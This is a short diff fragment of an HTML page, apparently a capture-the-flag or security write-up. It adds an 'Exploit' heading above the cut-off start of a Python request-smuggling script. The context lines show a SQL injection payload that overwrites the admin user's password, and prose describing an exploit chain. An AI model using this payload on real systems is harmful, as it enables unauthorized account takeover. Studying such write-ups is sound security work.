@@ -165,6 +165,7 @@ We could now do:</p>
 <pre><code>INSERT INTO users ('admin', '1337') ON CONFLICT(username) DO UPDATE SET password = 'cave';--&quot;
 </code></pre><p>And like that we have a long exploit chain, that should work. We just need to
 add the url encoding part.</p>
+<h1 id="exploit">Exploit</h1>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">smuggle</span>(req):
